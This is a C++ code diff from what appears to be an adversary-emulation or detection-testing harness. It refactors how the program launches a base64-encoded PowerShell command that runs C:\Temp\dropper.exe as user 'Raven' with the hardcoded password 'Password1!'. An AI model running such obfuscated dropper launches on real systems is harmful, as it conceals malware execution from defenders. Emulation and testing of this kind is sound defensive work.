@@ -58,42 +58,14 @@ int wmain()
 
     // create dropper process as user Raven
     Log("[+] Creating dropper process as Raven.", componentName);
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
 
     // powershell.exe -Command $username = 'Raven'; $password = 'Password1!';
     // $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
     // $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
     // Start-Process C:\\Temp\\dropper.exe -Credential $credential;
-
-    std::wstring cmd = L"powershell.exe -encodedCommand JAB1AHMAZQByAG4AYQBtAGUAIAA9ACAAJwBSAGEAdgBlAG4AJwA7ACAAJABwAGEAcwBzAHcAbwByAGQAIAA9ACAAJwBQAGEAcwBzAHcAbwByAGQAMQAhACcAOwAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHAAYQBzAHMAdwBvAHIAZAAgAC0AQQBzAFAAbABhAGkAbgBUAGUAeAB0ACAALQBGAG8AcgBjAGUAOwAgACQAYwByAGUAZABlAG4AdABpAGEAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJAB1AHMAZQByAG4AYQBtAGUALAAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAQwA6AFwAXABUAGUAbQBwAFwAXABkAHIAbwBwAHAAZQByAC4AZQB4AGUAIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAkAGMAcgBlAGQAZQBuAHQAaQBhAGwAOwA=";
-
-    // TODO: pause and record start timestamp
-
-    if (!CreateProcessW(
-        NULL,
-        const_cast<LPWSTR>(cmd.c_str()),
-        NULL,
-        NULL,
-        FALSE,
-        0,
-        NULL,
-        NULL,
-        &si,
-        &pi
-    )) {
-        Log("[!] Failed to create dropper process." + std::to_string(GetLastError()), componentName);
-    }
-    else {
-        Log("[+] Powershell process spawned.", componentName);
-    }
-
-    WaitForSingleObject(pi.hProcess, INFINITE);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    std::string cmdline = "powershell.exe -encodedCommand JAB1AHMAZQByAG4AYQBtAGUAIAA9ACAAJwBSAGEAdgBlAG4AJwA7ACAAJABwAGEAcwBzAHcAbwByAGQAIAA9ACAAJwBQAGEAcwBzAHcAbwByAGQAMQAhACcAOwAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHAAYQBzAHMAdwBvAHIAZAAgAC0AQQBzAFAAbABhAGkAbgBUAGUAeAB0ACAALQBGAG8AcgBjAGUAOwAgACQAYwByAGUAZABlAG4AdABpAGEAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJAB1AHMAZQByAG4AYQBtAGUALAAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAQwA6AFwAXABUAGUAbQBwAFwAXABkAHIAbwBwAHAAZQByAC4AZQB4AGUAIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAkAGMAcgBlAGQAZQBuAHQAaQBhAGwAOwA=";
+    
+    CreateProc("dropper", cmdline);
     //CloseHandle(ghMutex);
 
     // TODO: pop message box saying completed and give activity timestamps
